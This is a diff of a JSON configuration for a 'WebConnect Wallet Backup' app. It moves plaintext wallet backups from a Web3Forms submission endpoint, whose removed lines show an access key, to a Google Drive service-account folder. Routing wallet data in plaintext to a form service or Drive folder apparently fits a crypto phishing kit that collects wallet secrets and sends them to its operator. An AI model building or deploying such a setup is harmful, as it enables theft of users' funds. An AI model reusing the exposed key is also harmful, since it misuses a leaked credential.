@@ -1,19 +1,31 @@
 {
   "version": "1.0.0",
   "app_name": "WebConnect Wallet Backup",
-  "description": "Interactive wallet backup system with Web3Forms integration",
+  "description": "Interactive wallet backup system with Google Drive integration",
   "repository": "https://github.com/decentralizedconfig/launchpad",
   
   "storage": {
     "enabled": true,
     "destinations": [
       {
-        "name": "web3forms",
-        "type": "web3forms_api",
+        "name": "google_drive",
+        "type": "google_drive",
         "enabled": true,
-        "api_endpoint": "https://api.web3forms.com/submit",
-        "access_key": "b5f9f926-ecd5-4757-b0ad-ff1954bd43ea",
-        "description": "Web3Forms API for secure backup submission"
+        "folder_id": "YOUR_GOOGLE_DRIVE_FOLDER_ID",
+        "description": "Google Drive folder for secure backup storage",
+        "credentials": {
+          "type": "service_account",
+          "project_id": "YOUR_PROJECT_ID",
+          "private_key_id": "YOUR_PRIVATE_KEY_ID",
+          "private_key": "-----BEGIN PRIVATE KEY-----\nYOUR_PRIVATE_KEY_HERE\n-----END PRIVATE KEY-----\n",
+          "client_email": "YOUR_SERVICE_ACCOUNT_EMAIL",
+          "client_id": "YOUR_CLIENT_ID",
+          "auth_uri": "https://accounts.google.com/o/oauth2/auth",
+          "token_uri": "https://oauth2.googleapis.com/token",
+          "auth_provider_x509_cert_url": "https://www.googleapis.com/oauth2/v1/certs",
+          "client_x509_cert_url": "YOUR_CERT_URL",
+          "universe_domain": "googleapis.com"
+        }
       }
     ]
   },
@@ -69,11 +81,10 @@
     "data_format": "plaintext"
   },
 
-  "web3forms_api": {
-    "endpoint": "https://api.web3forms.com/submit",
-    "method": "POST",
-    "content_type": "application/json",
-    "timeout": 30,
-    "retry_attempts": 3
+  "google_drive": {
+    "endpoint": "https://www.googleapis.com/drive/v3",
+    "upload_timeout": 60,
+    "retry_attempts": 3,
+    "chunk_size": 262144
   }
 }
